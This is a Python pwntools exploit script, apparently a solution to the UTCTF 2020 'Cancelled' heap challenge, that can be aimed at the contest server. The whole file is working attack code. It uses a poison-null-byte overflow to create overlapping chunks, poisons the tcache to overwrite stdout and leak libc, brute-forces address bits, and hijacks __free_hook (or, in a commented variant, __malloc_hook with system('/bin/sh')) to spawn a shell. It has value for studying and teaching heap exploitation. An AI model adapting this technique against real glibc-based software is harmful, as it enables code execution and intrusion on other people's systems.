#!/usr/bin/python
from pwn import *

chdir = '/MOUNT/utctf-2020/Cancelled/'
config = {
        'elf': chdir + 'pwnable',
        'libc': chdir + 'libc-2.27.so',
        'HOST': 'binary.utctf.live',
        'PORT': 9050
        }

INPUT_PROMPT = None

def debug(r):
    context.terminal=['tmux', 'splitw', '-h']
    gdb.attach(r, gdbscript='''
        b *prompt
        b *cancel_person
        b *add_person
    ''')
 
def add(r, idx, data, sz, desc):
    r.sendlineafter('>','1')
    r.sendlineafter('Index: ',str(idx))
    r.sendlineafter('Name: ',data)
    r.sendlineafter('Length of description: ',str(sz))
    r.sendafter('Description: ', desc)

def cancel(r, idx):
    r.sendlineafter('>','2')
    r.sendlineafter('Index: ', str(idx))

def exploit(r, addr):
    add(r, 0, 'a', 0x4f8, 'a'*0x4f8)
    add(r, 1, 'b', 0x30, 'b'*0x30)
    add(r, 2, 'c', 0x40, 'c'*0x40)
    add(r, 3, 'd', 0x50, 'd'*0x50)
    add(r, 4, 'e', 0x60, 'e'*0x60)
    add(r, 5, 'f', 0x4f8, 'f'*0x4f8)
    add(r, 6, 'g', 0x60, 'g'*0x60)

    cancel(r, 4)
    add(r, 4, 'E', 0x68, 'E'*0x60 + p64(0x660) + "\x00") # Poison Null Byte
    cancel(r, 2) # Tcache bin[0x50] -> 2
    cancel(r, 0) # Unsorted bin -> 0
    cancel(r, 5) # Merged Chunk 0 ~ Chunk 5 - Overlapping Chunks
    add(r, 7, 'h', 0x530, 'A') # Allocated at Chunk 0, Unsorted bin -> 2 (Overlapping)
    cancel(r, 4) # Tcache bin[0x70] -> 4
    add(r, 8, 'i', 0xa0, p16(addr)) # Allocated at Chunk 2, Unsorted bin -> 4 (Overlapping)
                                    # Tcache bin[0x50] -> 2 -> &stdout
    log.info('Changed fd of unsorted bin')
    add(r, 9, 'j', 0x40, 'j'*0x40) # Tcache bin[0x50] -> &stdout
    try:
        log.info('Changed stdout structure')
        add(r, 10, 'k', 0x40, p64(0xfbad3887)+p64(0)*3+'\x00') # Allocated at stdout.
        r.recv(8)
        leak = u64(r.recv(8))
        libc.address = leak - 0x3ed8b0
        one_shot = libc.address + 0x4f322
        log.info("leak addr : {:#x}".format(leak))
        log.info("libc base : {:#x}".format(libc.address))
        if leak > 0x01000000000000: # Gussing Failed.
            return False

        # Allocated at Chunk 4, Tcache bin[0x70] -> 4 -> &__free_hook
        add(r, 11, 'l', 0xa0, p64(libc.symbols['__free_hook']))
        add(r, 12, 'm', 0x60, 'A') # Tcache bin[0x70] -> &__free_hook
        add(r, 13, 'n', 0x60, p64(one_shot)) # Allocated at &__free_hook
        cancel(r, 7) # one_shot

        ''' or different method.
        add(r, 11, 'l', 0xa8, p64(libc.symbols['__malloc_hook']))
        add(r, 12, 'm', 0x60, 'A') # Tcache bin[0x70] -> &__malloc_hook
        add(r, 13, 'n', 0x60, p64(libc.symbols['system'])) # Allocated at &__malloc_hook
        r.sendlineafter('>','1')
        r.sendlineafter(': ','0')
        r.sendlineafter(': ','a')
        r.sendlineafter('Length of description: ',str(libc.search('/bin/sh').next()))
        '''

        pause()
        r.interactive()
    except:
        return False
    return True

def brute_force():
    global local
    r = None
    for addr in range(0x0760, 0x10760, 0x1000):
        if local:
            r = process([config['elf']], env={"LD_PRELOAD":config['libc']})
        else:
            r = remote(config["HOST"], config["PORT"])
        if exploit(r, addr):
            success('Success ! end fo address: {:#x}'.format(addr))
            break
        else:
            log.info('Failed ... end of address : {:#x}'.format(addr))
            r.close()

if __name__ == '__main__':
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if len(sys.argv) > 1:
        local = False
    else:
        # context.log_level = 'debug'
        local = True
        r = process([config['elf']], env={"LD_PRELOAD":config['libc']})
        # debug(r)
        # exploit(r, 0x3760)
    brute_force()

